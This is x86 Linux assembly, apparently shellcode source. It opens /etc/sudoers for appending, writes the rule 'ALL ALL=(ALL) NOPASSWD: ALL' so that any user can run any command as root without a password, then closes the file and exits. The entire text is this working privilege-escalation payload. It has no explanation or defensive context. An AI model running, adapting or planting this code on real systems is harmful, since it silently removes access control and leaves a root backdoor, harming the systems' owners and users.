global _start

section .text

_start:

	;open("/etc/sudoers", O_WRONLY | O_APPEND);
	xor eax, eax
	push eax
	push 0x7372656f 
	push 0x6475732f
	push 0x6374652f
	mov ebx, esp
	mov cx, 0x401
	mov al, 0x05
	int 0x80

	mov ebx, eax  

	;write(fd, ALL ALL=(ALL) NOPASSWD: ALL\n, len);
	xor eax, eax
	push eax
	push 0x0a4c4c41
	push 0x203a4457
	push 0x53534150
	push 0x4f4e2029
	push 0x4c4c4128
	push 0x3d4c4c41
	push 0x204c4c41
	mov ecx, esp
	mov dl, 0x1c
	mov al, 0x04
	int 0x80

	;close(file)
	mov al, 0x06
	int 0x80

	;exit(0);
	xor ebx, ebx
	mov al, 0x01
	int 0x80

